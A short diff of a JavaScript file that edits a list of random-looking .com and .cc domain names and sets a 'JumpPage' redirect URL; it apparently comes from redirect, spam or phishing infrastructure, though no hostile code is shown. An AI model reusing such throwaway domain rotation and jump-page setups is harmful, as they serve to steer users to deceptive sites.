@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[];
-        urls.push(".hmspsdwf.com");   
-        urls.push(".wrveeaelk.cc");  
-        urls.push(".ueovkyhn.cc");    
+        urls.push(".leiwzcrcm.cc");   
+        urls.push(".hmspsdwf.com");  
+        urls.push(".wrveeaelk.cc");    
         
                      	
 var JumpPage="https://dnalpugxg.cc";
